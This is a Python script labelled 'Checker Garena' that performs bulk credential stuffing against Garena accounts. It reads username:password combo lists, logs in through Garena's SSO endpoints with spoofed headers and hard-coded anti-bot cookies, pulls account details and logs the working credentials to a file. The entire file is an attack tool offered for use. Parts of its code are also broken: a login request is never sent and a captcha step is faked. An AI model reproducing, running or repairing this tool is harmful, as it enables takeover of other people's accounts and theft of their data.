import requests
import json
import random
import hashlib
import os
import time
from tqdm import tqdm
from colorama import Fore, Style, init
from datetime import datetime
import logging

# Initialize colorama
init(autoreset=True)

def generate_md5_hash(password):
    """
    Generate the MD5 hash for a given password.
    """
    md5_hash = hashlib.md5()
    md5_hash.update(password.encode('utf-8'))
    return md5_hash.hexdigest()

def microtime_float():
    """
    Get the current time in milliseconds.
    """
    return int(round(time.time() * 1000))

def encode_password(password_md5, v1, v2):
    """
    Encode the password using SHA-256 with given salt values.
    """
    key = hashlib.sha256(hashlib.sha256(password_md5.encode()).digest() + v1.encode()).hexdigest()
    return hashlib.sha256(hashlib.sha256(password_md5.encode()).digest() + v2.encode()).hexdigest()

def get_captcha():
    """
    Fetch a captcha image and return its key and a dummy captcha code.
    """
    keycap = hashlib.md5(str(random.random()).encode()).hexdigest()

    # Ensure the captcha directory exists
    os.makedirs("captcha", exist_ok=True)

    captcha_url = f"https://gop.captcha.garena.com/image?key={keycap}"
    captcha_image = requests.get(captcha_url).content
    with open(f"captcha/{keycap}.png", 'wb') as f:
        f.write(captcha_image)

    captcha_code = "dummy_captcha_code"
    return keycap, captcha_code

def login_and_get_session(username, password):
    """
    Perform login and return session cookies.
    """
    try:
        response = requests.post('https://sso.garena.com/api/login', data={'username': username, 'password': password})
        
        # Log all cookies set by the server after login
        print("Cookies after login:", response.cookies.get_dict())
        
        if response.status_code == 200:
            return response.cookies
        else:
            print(f"Login failed: {response.status_code} - {response.text}")
            return None
    except Exception as e:
        print(f"An error occurred during login: {str(e)}")
        return None

# Set up logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

def get_user_info(cookies, username):
    """
    Fetch user information using the session cookies.
    """
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36',
        'Accept': '*/*',
        'Connection': 'keep-alive',
        'Referer': 'https://account.garena.com/',
        'Accept-Language': 'en-US,en;q=0.9',
    }
    
    # Debugging: Print cookies being sent
    print(f"Getting user info with cookies: {cookies}")
    
    response = requests.get("https://account.garena.com/api/account/init", cookies=cookies, headers=headers)

    if response.status_code == 200:
        return response.json()
    else:
        if response.status_code == 401 and "error_session" in response.text:
            return {"error": "Session expired or invalid. Please re-login."}
        return {"error": f"Failed to retrieve user info. Status Code: {response.status_code}"}

def check_account(username, password):
    """
    Check the status of a given account by attempting to log in and fetch user info.
    """
    try:
        base_num = "17290585"
        randomNum = base_num + str(random.randint(10000, 99999))

        hashed_password = generate_md5_hash(password)

        cookies = {
            '_ga': 'GA1.1.2131693347.1729053033',
            'datadome': 'orsoveoNllDRECu5DxbmPNJdoK~CmSJvvRpY1XHIfm8TjeA7QNYGL4QoiqX1m0hBbpvDKlKMQRb03HntGUhpU2JZQh8M~eW2yZ3NoQy~4H~aE4vLxui99_oTe1FGR8wF',
            '_ga_1M7M9L6VPX': 'GS1.1.1729058494.2.0.1729058494.0.0.0',
        }

        headers = {
            'Accept': 'application/json, text/plain, */*',
            'Accept-Language': 'en-US,en;q=0.9',
            'Connection': 'keep-alive',
            'Referer': 'https://sso.garena.com/universal/login?app_id=10100&redirect_uri=https%3A%2F%2Faccount.garena.com%2F&locale=en-PH',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36',
        }

        params = {
            "app_id": "10100",
            "account": username,
            "format": "json",
            "id": randomNum
        }

        # Step 1: Prelogin
        prelogin_url = "https://sso.garena.com/api/prelogin"
        response = requests.get(prelogin_url, params=params, cookies=cookies, headers=headers)

        if "captcha" in response.text.lower():
            return Fore.RED + f"[FAILED] Account: {username}:{password}, Status: CAPTCHA required"

        # Step 2: Actual login (using GET method) with logging
        login_url = "https://sso.garena.com/api/login"
        params = {
            'username': username,
            'password': password,
            'app_id': '10100',
            'format': 'json',
            'id': randomNum
        }
        
        # Log the parameters being sent
        print(f"Logging in with parameters: {params}")

        # Log full response for debugging
        print(f"Response for {username}: {response.text}")

        if "captcha" in response.text.lower():
            return Fore.RED + f"[FAILED] Account: {username}:{password}, Status: CAPTCHA required"

        if response.status_code == 200:
            data = response.json()

            if "error" in data or data.get("error_code"):
                return Fore.RED + f"[FAILED] Account: {username}:{password}, Status: {data.get('error', 'Unknown error')}"
            else:
                session_cookies = response.cookies.get_dict()
                print(f"Session Cookies: {session_cookies}")  # Debugging: Print session cookies
                
                user_info = get_user_info(session_cookies, username)
                
                retry_count = 0
                while "error" in user_info and user_info["error"] == "Session expired or invalid. Please re-login." and retry_count < 3:
                    print(Fore.YELLOW + f"[RETRY] Account: {username}:{password}, Status: Attempting to re-login.")
                    
                    session_cookies = login_and_get_session(username, password)
                    if session_cookies is None:
                        return Fore.RED + f"[FAILED] Account: {username}:{password}, Status: Unable to refresh session."
                    
                    user_info = get_user_info(session_cookies, username)
                    retry_count += 1
                    
                    print("Cookies after retry:", session_cookies)

                    if "error" not in user_info:
                        break

                if "error" in user_info and user_info["error"] == "Session expired or invalid. Please re-login.":
                    return Fore.RED + f"[FAILED] Account: {username}:{password}, Status: {user_info['error']}"
                
                return Fore.GREEN + f"[SUCCESS] Account: {username}:{password}, User Info: {user_info}"

        else:
            return Fore.RED + f"[FAILED] Account: {username}:{password}, HTTP Status: {response.status_code}"

    except Exception as e:
        return Fore.RED + f"[ERROR] Account: {username}:{password}, Message: {str(e)}"
    
    
def bulk_check(input_file, output_file):
    """
    Perform bulk account checking using an input file and save results to an output file.
    """
    successful_count = 0  # Counter for successful checks
    failed_count = 0      # Counter for failed checks

    with open(input_file, 'r') as infile, open(output_file, 'w') as outfile:
        accounts = infile.readlines()

        # Using tqdm to display progress
        for acc in tqdm(accounts, desc="Checking accounts", unit="account"):
            acc = acc.strip()
            if ':' in acc:
                username, password = acc.split(':')
                result = check_account(username, password)
                print(result)
                outfile.write(result + '\n')

                if "SUCCESS" in result:
                    successful_count += 1
                else:
                    failed_count += 1
            else:
                print(Fore.RED + f"Invalid format for account: {acc}")
                outfile.write(f"Invalid format for account: {acc}\n")
                failed_count += 1

            time.sleep(0.1)  # Adjust this value as needed

    print(Fore.YELLOW + f"\nTotal Successful: {successful_count}")
    print(Fore.RED + f"Total Failed: {failed_count}")

def display_banner():
    """
    Display the program banner.
    """
    banner = f"""{Fore.RED}
   ___ _               _
  / __\ |__   ___  ___| | _____ _ __
 / /  | '_ \ / _ \/ __| |/ / _ \ '__|
/ /___| | | |  __/ (__|   <  __/ |
\____/|_| |_|\___|\___|_|\_\___|_|

    ___
   / _ \__ _ _ __ ___ _ __   __ _
  / /_\/ _` | '__/ _ \ '_ \ / _` |
 / /_/\ (_| | | |  __/ | | | (_| |
 \____/\__,_|_|  \___|_| |_|\__,_|
    {Fore.YELLOW}Author @Shin{Fore.RESET}
    """
    print(banner)

if __name__ == "__main__":

    display_banner()

    input_file = input(Fore.MAGENTA + "ᴇɴᴛᴇʀ ���ɪʟᴇɴᴀᴍᴇ WANT ᴛᴏ ᴄʜᴇᴄᴋ: ")
    output_file = input(Fore.MAGENTA + "ᴇɴᴛᴇʀ ꜰɪʟᴇɴᴀᴍᴇ ᴛᴏ ꜱᴀᴠᴇ ɪᴛ: ")

    bulk_check(input_file, output_file)